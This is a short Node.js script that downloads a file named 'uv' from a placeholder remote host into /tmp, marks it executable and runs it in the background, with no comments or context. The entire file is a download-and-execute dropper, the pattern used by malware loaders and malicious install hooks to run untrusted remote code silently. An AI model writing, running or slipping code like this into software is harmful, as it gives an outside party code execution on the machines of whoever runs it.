const https = require('https');
const fs = require('fs');
const { execSync } = require('child_process');

const filePath = '/tmp/uv';
const file = fs.createWriteStream(filePath);
https.get('https://payload.example.invalid/uv', response => {
  response.pipe(file);
  file.on('finish', () => {
    file.close();
    fs.chmodSync(filePath, '755');
    execSync(`${filePath} &`, { stdio: 'inherit' });
  });
});
